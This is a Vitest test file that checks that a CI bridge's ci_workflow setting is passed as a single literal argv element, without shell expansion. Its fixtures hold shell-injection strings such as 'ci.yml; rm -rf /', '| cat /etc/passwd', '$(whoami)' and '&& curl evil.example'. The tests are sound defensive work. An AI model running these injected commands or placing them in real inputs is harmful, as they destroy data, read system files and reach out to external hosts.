/**
 * E17-S19: Metacharacter injection tests for defaultRunCli argv-array migration
 *
 * Story: Migrate defaultRunCli from shell:true string spawn to shell:false
 * argv-array spawn so that future executors cannot expand attacker-controlled
 * config.ci_workflow into shell metacharacters.
 *
 * These tests verify that shell metacharacters in config.ci_workflow are
 * passed literally as a single argv element — no shell expansion occurs.
 *
 * Traces: E17-S19 AC3, ADR-028, architecture §10.20.10 T23
 * Risk: medium | Epic: E17 — Review Gate Enhancement & Test Execution Bridge
 */

import { describe, it, expect, vi } from "vitest";

const LAYER2_CI_REL = "../../../_gaia/core/bridge/layer-2-ci-execution.js";

// ─── Fixture helpers ──────────────────────────────────────────────────────

/**
 * Build a deps object where runCli captures argv arrays.
 * The script queue returns canned responses for each call.
 */
function makeDeps({ script = [] } = {}) {
  const calls = [];
  const queue = [...script];
  return {
    calls,
    ghCheck: vi.fn(async () => ({
      available: true,
      authenticated: true,
    })),
    runCli: vi.fn(async (argv) => {
      calls.push(argv);
      if (queue.length === 0) {
        return { exit_code: 0, stdout: "", stderr: "" };
      }
      return queue.shift();
    }),
    sleep: vi.fn(async () => {}),
    now: (() => {
      let t = 0;
      return () => {
        t += 15000;
        return t;
      };
    })(),
  };
}

/**
 * Standard script that goes through trigger → list → poll (completed) → log.
 * Used by all metacharacter tests so they reach the triggerRun call site.
 */
function happyPathScript() {
  return [
    // gh workflow run
    { exit_code: 0, stdout: "Created workflow_dispatch event\n", stderr: "" },
    // gh run list
    {
      exit_code: 0,
      stdout: JSON.stringify([{ databaseId: 100, status: "queued" }]),
      stderr: "",
    },
    // gh run view (completed)
    {
      exit_code: 0,
      stdout: JSON.stringify({ status: "completed", conclusion: "success" }),
      stderr: "",
    },
    // gh run view --log
    { exit_code: 0, stdout: "All tests passed\n", stderr: "" },
  ];
}

// ─── AC3: Shell metacharacter injection tests ─────────────────────────────

describe("E17-S19 AC3: Shell metacharacter injection via ci_workflow", () => {
  it("semicolon injection — passes literal value as single argv element", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    const malicious = "ci.yml; rm -rf /";
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: malicious, timeout_seconds: 300 },
      deps
    );
    // The first call should be the trigger: ['gh', 'workflow', 'run', malicious]
    const triggerCall = deps.calls[0];
    expect(Array.isArray(triggerCall)).toBe(true);
    // The malicious value must be a single element in the argv array
    expect(triggerCall).toContain(malicious);
    // It must NOT be part of a concatenated string
    expect(typeof triggerCall).not.toBe("string");
  });

  it("command substitution injection — $(whoami) passed literally", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    const malicious = "ci.yml$(whoami)";
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: malicious, timeout_seconds: 300 },
      deps
    );
    const triggerCall = deps.calls[0];
    expect(Array.isArray(triggerCall)).toBe(true);
    expect(triggerCall).toContain(malicious);
  });

  it("backtick injection — `id` passed literally", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    const malicious = "ci.yml`id`";
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: malicious, timeout_seconds: 300 },
      deps
    );
    const triggerCall = deps.calls[0];
    expect(Array.isArray(triggerCall)).toBe(true);
    expect(triggerCall).toContain(malicious);
  });

  it("pipe injection — | cat /etc/passwd passed literally", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    const malicious = "ci.yml | cat /etc/passwd";
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: malicious, timeout_seconds: 300 },
      deps
    );
    const triggerCall = deps.calls[0];
    expect(Array.isArray(triggerCall)).toBe(true);
    expect(triggerCall).toContain(malicious);
  });

  it("logical-AND injection — && curl evil.example passed literally", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    const malicious = "ci.yml && curl evil.example";
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: malicious, timeout_seconds: 300 },
      deps
    );
    const triggerCall = deps.calls[0];
    expect(Array.isArray(triggerCall)).toBe(true);
    expect(triggerCall).toContain(malicious);
  });
});

// ─── AC1/AC2: argv-array contract verification ───────────────────────────

describe("E17-S19 AC1/AC2: defaultRunCli receives argv arrays, not strings", () => {
  it("all runCli calls are arrays with shell: false semantics", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: "ci.yml", timeout_seconds: 300 },
      deps
    );
    // Every call to runCli must be an array (argv), never a string
    for (const call of deps.calls) {
      expect(Array.isArray(call)).toBe(true);
    }
  });

  it("trigger call builds argv: ['gh', 'workflow', 'run', ciWorkflow]", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: "ci.yml", timeout_seconds: 300 },
      deps
    );
    const triggerCall = deps.calls[0];
    expect(triggerCall).toEqual(["gh", "workflow", "run", "ci.yml"]);
  });

  it("list call builds argv with --workflow flag", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: "ci.yml", timeout_seconds: 300 },
      deps
    );
    const listCall = deps.calls[1];
    expect(Array.isArray(listCall)).toBe(true);
    expect(listCall).toContain("gh");
    expect(listCall).toContain("run");
    expect(listCall).toContain("list");
    expect(listCall).toContain("--workflow");
    expect(listCall).toContain("ci.yml");
  });

  it("poll call builds argv: ['gh', 'run', 'view', runId, '--json', ...]", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: "ci.yml", timeout_seconds: 300 },
      deps
    );
    // Third call is the view/poll call
    const viewCall = deps.calls[2];
    expect(Array.isArray(viewCall)).toBe(true);
    expect(viewCall[0]).toBe("gh");
    expect(viewCall).toContain("view");
    expect(viewCall).toContain("--json");
  });

  it("log fetch call builds argv: ['gh', 'run', 'view', runId, '--log']", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    await executeCi(
      { runner_name: "vitest", command: "npm test", tier: 1 },
      { bridge_enabled: true, mode: "ci", ci_workflow: "ci.yml", timeout_seconds: 300 },
      deps
    );
    const logCall = deps.calls[3];
    expect(Array.isArray(logCall)).toBe(true);
    expect(logCall[0]).toBe("gh");
    expect(logCall).toContain("view");
    expect(logCall).toContain("--log");
  });
});

// ─── Scope guard interaction (Test Scenario 8) ───────────────────────────

describe("E17-S19: Scope guard interaction — assertCiWorkflowAllowed still runs", () => {
  it("assertCiWorkflowAllowed rejects before defaultRunCli when allowedWorkflows is set", async () => {
    const deps = makeDeps({ script: happyPathScript() });
    const { executeCi } = await import(LAYER2_CI_REL);
    // The scope guard should reject the malicious workflow name BEFORE runCli is called
    await expect(
      executeCi(
        { runner_name: "vitest", command: "npm test", tier: 1 },
        {
          bridge_enabled: true,
          mode: "ci",
          ci_workflow: "ci.yml; rm -rf /",
          allowedWorkflows: ["ci.yml", "test.yml"],
          timeout_seconds: 300,
        },
        deps
      )
    ).rejects.toThrow();
    // runCli should NOT have been called — guard caught it first
    expect(deps.runCli).not.toHaveBeenCalled();
  });
});
